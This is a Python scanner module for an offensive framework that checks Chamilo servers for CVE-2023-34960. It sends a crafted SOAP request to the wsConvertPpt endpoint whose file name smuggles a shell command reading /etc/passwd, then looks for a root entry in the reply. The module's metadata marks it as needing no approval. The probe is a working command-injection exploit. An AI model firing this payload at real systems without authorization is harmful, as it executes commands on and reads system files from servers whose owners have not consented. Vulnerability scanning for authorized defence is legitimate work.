#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A command injection vulnerability in the wsConvertPpt component of Chamilo v1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Chamilo Command Injection Detection',
        'description': 'A command injection vulnerability in the wsConvertPpt component of Chamilo v1.11.* up to v1.11.18 allows attackers to execute arbitrary commands via a SOAP API call with a crafted PowerPoint name.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'chamilo', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://sploitus.com/exploit?id=FD666992-20E1-5D83-BA13-67ED38E1B83D',
            'https://github.com/Aituglo/CVE-2023-34960/blob/master/poc.py',
            'http://chamilo.com',
            'http://packetstormsecurity.com/files/174314/Chamilo-1.11.18-Command-Injection.html',
            'https://support.chamilo.org/projects/1/wiki/Security_issues#Issue-112-2023-04-20-Critical-impact-High-risk-Remote-Code-Execution',
        ],
        'cve': 'CVE-2023-34960',
    }

    def run(self):
        path = '/main/webservices/additional_webservices.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/xml; charset=utf-8'}, data='<?xml version="1.0" encoding="UTF-8"?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{{RootURL}}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{}`.pptx\'|" |cat /etc/passwd||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('text/xml',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Chamilo Command Injection detected', path=path)
            return True
        return False

